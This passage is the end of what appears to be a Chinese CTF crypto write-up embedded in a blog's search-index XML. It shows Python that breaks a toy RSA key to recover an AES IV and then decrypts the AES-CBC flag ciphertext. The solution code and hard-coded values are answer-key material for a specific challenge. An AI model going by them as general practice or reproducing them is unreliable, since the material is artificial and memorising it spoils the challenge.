class="hljs-number">0x6240740d41a539a88634726cf0a791a87e02419c3c3e00dff62eba59e81a93fd04a59109e57f64fc375b9a321583b6fa133317eb5c4e6eb1e6f6d9a0b4ae6ff0c54423718811f7956cd63b7bf9c7f8e29f48dad8f05b63b71d6c5112d91864adba0d6bb342c67aee39ccd5e2a6928a8e4ab2248d29a0c990bae821b31b39b1f3</span><br>q=n2//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">65537</span><br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c2,d,n2)<br>print(long_to_bytes(m))<br><span class="hljs-comment">#iv=b&#x27;\xf5\xf6\xa8\x8b\x08U\xedG\xe0\xdew\x1c\xaf&lt;\xb2&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>iv和key都已求出，进行最后一步。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> binascii<br>key=<span class="hljs-string">b&#x27;\x89)\xef\x12\xa1\x7f\x14[\xc9\xb4\x8a\xfa,\x88\xa2\xef&#x27;</span><br>iv=<span class="hljs-string">b&#x27;\xf5\xf6\xa8\x8b\x08U\xedG\xe0\xdew\x1c\xaf&lt;\xb2&gt;&#x27;</span><br>aa = AES.new(key, AES.MODE_CBC, iv)<br>data = <span class="hljs-string">&#x27;f8559d671b720cd336f2d8518ad6eac8c405585158dfde74ced376ba42d9fe984d519dc185030ddec7b4dc240fd90fa8&#x27;</span><br>data = binascii.a2b_hex(data)<br>data = aa.decrypt(data)<br>print(data)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -ctf -rsa -aes</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
